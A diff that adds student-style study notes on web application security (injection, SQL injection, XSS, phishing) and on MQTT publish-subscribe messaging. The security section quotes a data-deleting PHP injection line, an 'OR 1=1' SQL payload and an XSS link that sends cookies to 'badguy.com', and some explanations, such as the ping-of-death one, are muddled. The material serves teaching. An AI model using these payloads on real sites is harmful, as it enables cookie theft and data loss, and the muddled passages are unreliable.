@@ -652,3 +652,112 @@ XACML can be combined with RBAC and ABAC. The main takeaways of SAML are the att
 - What is ABAC? What is an ABAC policy? What are the advantages of ABAC over RBAC?
 - What is XACML? What is a XACML target, effect, condition, rule policy, and policy set? What are the XACML policy combining algorithms?
 - Describe the XACML architecture
+
+## Web application security
+
+When tying to check if a computer is alive you can send a ping that is usually 64 bytes but in IPv4 it's possible to send ping up to `2^16` (65,535) bytes.  
+A **ping of death** is a set of well-formed fragmented packets that when are reassembled by the server, the malformed packets make the system crash and injection is possible.  
+
+Because HTTP is stateless, there is the need of **cookies** to keep track of the connection.
+
+### Cookies connection
+
+![Cookies connection](https://i.imgur.com/Zoqz2cL.png)
+
+### Web application security for real
+
+**Web application security** deals with security of websites, web applications and web services. Meanwhile **Allication security** specifically is focused in imporving application security by finding, fixing and preventing security vulnerabilities.
+
+![Different types of attacks](https://i.imgur.com/pKW1hGa.png)
+
+Some types of web threats are:
+- **web atacker** can for example take control of a website
+- **network attacker** can make dns poisoning and wireless eavesdropper
+- **malware attacker** can take control of an OS
+
+The **goals of web security** are: safely browse the web (confidentiality and integrity), support secure web apps and support secure mobile apps.
+
+### Injection attack
+
+Them most dangerous attack in terms of risk is the **injection attack**. Is consist of executing arbitrary code on the server.
+An example in PHP is using the eval stement and executing code:
+
+```PHP
+$ans= 10 ; system(`rm*.*’)
+```
+
+which leads to esase all the system data.
+
+Another common exaple is **SQL injection** in which the attacker injects some code to a  SQL query like:
+
+``` SQL
+SELECT * FROM Person WHERE UserId= 105 OR 1=1;
+```
+
+in this case the SQL query is asking not only to match the UserID but also `1=1` that is always true.
+
+One possible way to solve these problem is to check everytime the input that's passed to the server to avoid that a person can be alble to make something like this.
+
+### Cross-site scripting (XSS)
+
+**Cross-site scripting** enables attacker to inhect client-side scripts into web pages as JavaScript from a site can access that site's cookies.
+
+An example of XSS attack is to make the victim open the link
+
+``` URL
+http://victim.com/search.php? term = <script> window.open( “http://badguy.com?cookie= ” + document.cookie) </script>
+```
+
+When in the website that the victim is opening the website contains:
+
+``` HTML
+<BODY>Results for <?php echo $_GET[term] ?> : ... </BODY>
+```
+
+An important mitigation to the Universal-XSS (U-XSS) attacks is to have the same-origin policy in which the origin is defined as URI scheme, host name and port number.  
+
+A **mitigation for XSS** attacks is to never trust the client side and filter always the input.
+
+### Phishing attacks
+
+The **phishing attacks** are attacks in which the user get unsuspecting emails composed to make the user discose informations or visiting websites in order to gain access to thir identities.  
+
+**Phishing attack countermesures** are:
+
+- make the certificate authority check the authenticity of the website
+- browsers canblock suspicious websites
+- educate people in detecting these attacks
+- make prople checking if the email has personal informations
+  - spear phishing is the attack in which the attacker has personal informations
+
+### Web application security questions
+
+- What is web application security?
+- For which kind of security threats found in web applications, TLS is not an adequate countermeasures?
+- Which kind of attackers threaten web applications?
+- What is an injection attacks?  Give at least two examples of such an attack.
+- What is a CSRF attack? Give a high level description of how to mount it.
+- What is a XSS attack? Give a high level description of how to mount it.
+- What is a Phishing attack? Give a high level description of how to mount it.
+- What are the main mitigation measures for injection attacks? And for CSRF attacks? And For XSS attacks? And for Phishing attacks?
+
+## Publish-Subscription Communication
+
+The publish-subscribe communication consist of:
+
+- the **pubblisher** that produce data in for of an event
+- the **subscriber** that declare interest on pubblished data with subscription
+- the **event notification system** notifies each subscriber the pubblished events
+
+### Message Queue Telemetry Transport (MQTT)
+
+**Message Queue Telemetry Transport** (MQTT) is a lightweight messagging protocol that is designed to minimise the network bandwidth and it's based on the publish subscribe communication.  
+This protocol is designed to fit the machine to machine (M2M) and IOT world.  
+
+In the MQTT protocol the subscription mechanism can be organized in topics, for example livingroom or temperature.
+
+In MQTT the security standards that can be implemented are the credentials and SSL. The problem with SSL is that the procol has been created to be lightweight and this make everything going way slower.
+
+![MQTT](https://i.imgur.com/GpRzGMF.png)
+
+Some possible attacks can be made like brute force attack because there is no mechanism to stop them.
